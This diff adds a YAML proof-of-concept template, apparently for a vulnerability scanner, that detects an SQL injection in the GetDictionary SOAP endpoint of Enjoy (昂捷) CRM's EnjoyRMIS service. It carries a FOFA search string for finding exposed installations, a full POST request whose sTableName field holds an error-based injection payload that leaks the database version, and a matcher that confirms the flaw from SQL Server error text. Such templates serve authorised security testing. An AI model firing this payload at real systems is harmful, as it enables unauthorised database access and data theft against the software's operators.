@@ -1,0 +1,24 @@
+id: poc-yaml-enjoyrmis-getdictionary-sqli
+info:
+  name: 昂捷CRM GetDictionary SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: enjoyrmis
+  fofa: body="CheckSilverlightInstalled"
+requests:
+- method: POST
+  path: /EnjoyRMIS_WS/WS/ReportTool/cwsqry.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: http://tempuri.org/GetDictionary
+  data: "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    \ xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n\
+    \      <tem:GetDictionary>\n         <!--type: string-->\n         <tem:sTableName>1'and\
+    \ 1=@@version--</tem:sTableName>\n      </tem:GetDictionary>\n   </soapenv:Body>\n\
+    </soapenv:Envelope>"
+  expression: "status_code == 500 && \ncontains(body,\"soap:Server\") &&\ncontains(body,\"\
+    在将\") &&\nmatches(body,\"转换成数据类型(.*?)时失败\") &&\nmatches(body,\"在将(.*?)值\") &&\n\
+    contains(content_type,\"text/xml\")\n"
+variables: {}
+transport: http
